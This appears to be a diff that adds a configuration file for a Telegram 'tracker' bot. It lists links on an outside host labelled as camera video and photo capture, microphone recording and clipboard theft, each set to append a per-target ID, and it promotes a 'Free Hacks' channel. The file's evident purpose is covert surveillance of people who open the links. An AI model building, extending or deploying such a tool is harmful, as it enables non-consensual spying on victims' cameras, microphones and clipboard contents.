@@ -1,0 +1,34 @@
+{
+    "trackers": [
+        {
+            "label": "Font Camera Hack Video",
+            "url": "https://w8team.pw/Bots/W8TrackerProBot/FontCM.html",
+            "append_id": true
+        },
+        {
+            "label": "Back Camera Hack Video",
+            "url": "https://w8team.pw/Bots/W8TrackerProBot/BackCM.html",
+            "append_id": true
+        },
+        {
+            "label": "Camera Hack Photo",
+            "url": "https://w8team.pw/Bots/W8TrackerProBot/CameraPH.html",
+            "append_id": true
+        },
+        {
+            "label": "Microphone Hack Audio",
+            "url": "https://w8team.pw/Bots/W8TrackerProBot/Microphone.html",
+            "append_id": true
+        },
+        {
+            "label": "Clipboard Hack",
+            "url": "https://w8team.pw/Bots/W8TrackerProBot/Clipboard.html",
+            "append_id": true
+        }
+    ],
+    "channel": {
+        "label": "Join Channel Free Hacks",
+        "url": "https://t.me/W8TeamSB"
+    },
+    "banned": []
+}
